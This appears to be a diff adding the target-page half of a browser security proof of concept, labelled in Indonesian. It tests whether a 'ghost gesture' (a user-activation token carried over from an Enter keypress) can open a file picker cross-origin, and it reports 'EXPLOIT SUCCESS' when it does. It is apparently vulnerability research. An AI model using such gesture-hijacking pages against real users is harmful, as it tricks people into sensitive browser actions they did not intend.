@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Sensitive Action Proof (Origin B)</title>
+</head>
+
+<body style="background-color: #e8f5e9; text-align: center; font-family: sans-serif;">
+    <h3>Situs B (Target Origin - GitHub)</h3>
+    <h1 style="color: red;">LEPASKAN TOMBOL "ENTER" SEKARANG!</h1>
+
+    <div id="status" style="border: 2px solid black; padding: 20px; margin: 20px; text-align: left;">
+        Menunggu Ghost Gesture...
+    </div>
+
+    <script>
+        window.addEventListener('keyup', async (e) => {
+            if (e.key === 'Enter') {
+                const statusDiv = document.getElementById('status');
+                const isActive = navigator.userActivation.isActive;
+
+                if (isActive) {
+                    statusDiv.innerHTML += "<br><br><b>[+] User Activation Terdeteksi!</b>";
+                    statusDiv.innerHTML += "<br>[*] Mencoba memanggil File Picker...";
+
+                    try {
+                        const [fileHandle] = await window.showOpenFilePicker({
+                            multiple: false
+                        });
+                        
+                        statusDiv.innerHTML += 
+                            `<br><span style='color:green;'><b>✅ EXPLOIT SUCCESS: File Picker terbuka di Cross-Origin!</b> (User memilih: ${fileHandle.name})</span>`;
+                            
+                    } catch (err) {
+                        if (err.name === 'AbortError') {
+                            statusDiv.innerHTML += 
+                                `<br><span style='color:blue;'><b>✅ EXPLOIT SUCCESS: File Picker terbuka!</b> (Tapi user cancel pemilihan file)</span>`;
+                        } else {
+                            statusDiv.innerHTML += 
+                                `<br><span style='color:red;'><b>❌ BLOCKED:</b> ${err.name} - ${err.message}</span>`;
+                        }
+                    }
+                } else {
+                    statusDiv.innerHTML += "<br><span style='color:orange;'>⚠️ Keyup terdeteksi, tapi User Activation token kosong/tidak valid.</span>";
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
